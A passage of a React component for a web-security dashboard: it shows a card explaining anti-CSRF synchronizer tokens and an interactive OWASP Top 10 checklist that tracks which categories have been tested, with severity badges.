              <div className="p-3 rounded-xl bg-slate-50 dark:bg-slate-800/60 border border-slate-200 dark:border-slate-700">
                <p className="font-bold text-slate-900 dark:text-slate-100">2. Anti-CSRF Synchronizer Tokens</p>
                <p className="text-[11px] text-slate-500 mt-1">
                  Embed unique cryptographic tokens in form headers (`X-CSRF-Token`) that external malicious sites cannot read due to the Same-Origin Policy.
                </p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* TAB 5: OWASP TOP 10 SCORECARD */}
      {activeTab === "owasp" && (
        <div className="space-y-6">
          <div className="rounded-3xl border border-slate-200 bg-white p-6 shadow-sm dark:border-slate-800 dark:bg-slate-900 space-y-4">
            <div className="flex items-center justify-between">
              <div>
                <h3 className="text-sm font-bold text-slate-900 dark:text-slate-100">
                  OWASP Top 10 Web Application Security Scorecard
                </h3>
                <p className="text-xs text-slate-500">
                  Track your vulnerability testing and audit defense checklist.
                </p>
              </div>
              <span className="text-xs font-bold text-brand-600 bg-brand-50 dark:bg-brand-950/40 px-3 py-1 rounded-full border border-brand-200 dark:border-brand-800">
                {testedCount} / 10 Completed
              </span>
            </div>

            <div className="grid gap-3 sm:grid-cols-2">
              {owaspList.map((item) => (
                <div
                  key={item.id}
                  onClick={() => toggleOwasp(item.id)}
                  className={`p-4 rounded-2xl border transition-all cursor-pointer flex items-start gap-3 ${
                    item.tested
                      ? "bg-emerald-50/60 border-emerald-300 dark:bg-emerald-950/30 dark:border-emerald-800"
                      : "bg-slate-50 border-slate-200 hover:border-slate-300 dark:bg-slate-800/40 dark:border-slate-700"
                  }`}
                >
                  <div className={`mt-0.5 h-5 w-5 rounded-md flex items-center justify-center ${
                    item.tested ? "bg-emerald-500 text-white" : "border border-slate-300 dark:border-slate-600"
                  }`}>
                    {item.tested && <CheckCircle2 size={14} />}
                  </div>

                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-slate-900 dark:text-slate-100">{item.name}</span>
                      <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded ${
                        item.severity === "Critical"
                          ? "bg-rose-100 text-rose-700 dark:bg-rose-950 dark:text-rose-300"
                          : item.severity === "High"
                          ? "bg-amber-100 text-amber-700 dark:bg-amber-950 dark:text-amber-300"
                          : "bg-blue-100 text-blue-700 dark:bg-blue-950 dark:text-blue-300"
                      }`}>
                        {item.severity}
                      </span>
                    </div>
                    <p className="text-[10px] font-mono text-slate-400 mt-0.5">{item.code}</p>
                    <p className="text-xs text-slate-500 dark:text-slate-400 mt-1 leading-relaxed">{item.desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
